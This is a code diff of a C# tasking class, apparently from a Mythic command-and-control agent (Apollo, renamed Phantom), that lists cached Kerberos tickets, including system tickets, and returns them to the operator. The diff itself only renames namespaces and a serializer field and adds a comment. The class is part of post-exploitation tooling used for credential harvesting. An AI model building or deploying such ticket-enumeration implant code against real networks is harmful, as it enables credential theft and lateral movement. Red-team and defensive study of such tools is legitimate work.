@@ -10,11 +10,11 @@ using System;
 using System.Collections.Generic;
 using System.Runtime.Serialization;
 using System.Text;
-using PhantomInterop.Classes;
-using PhantomInterop.Features.KerberosTickets;
-using PhantomInterop.Interfaces;
-using PhantomInterop.Structs.MythicStructs;
-using PhantomInterop.Utils;
+using ApolloInterop.Classes;
+using ApolloInterop.Features.KerberosTickets;
+using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.MythicStructs;
+using ApolloInterop.Utils;
 
 namespace Tasks;
 
@@ -36,7 +36,7 @@ public class ticket_cache_list : Tasking
     public override void Start()
     {
         MythicTaskResponse resp = new MythicTaskResponse { };
-        TicketListParameters parameters = _dataSerializer.Deserialize<TicketListParameters>(_data.Parameters);
+        TicketListParameters parameters = _jsonSerializer.Deserialize<TicketListParameters>(_data.Parameters);
         string luid = parameters.luid ?? "";
         bool getSystemTickets = parameters.getSystemTickets ?? false;
         try
@@ -50,13 +50,13 @@ public class ticket_cache_list : Tasking
                 currentTicket.CurrentLuid = currentLuid;
                 ticketList.Add(currentTicket);
             }
-            resp = CreateTaskResponse(_dataSerializer.Serialize(ticketList), true);
+            resp = CreateTaskResponse(_jsonSerializer.Serialize(ticketList), true);
         }
         catch (Exception e)
         {
             resp = CreateTaskResponse($"Failed to enumerate tickets: {e.Message}",true, "error");
         }
-        
+        //get and send back any artifacts
         IEnumerable<Artifact> artifacts = _agent.GetTicketManager().GetArtifacts();
         var artifactResp = CreateArtifactTaskResponse(artifacts);
         _agent.GetTaskManager().AddTaskResponseToQueue(artifactResp);
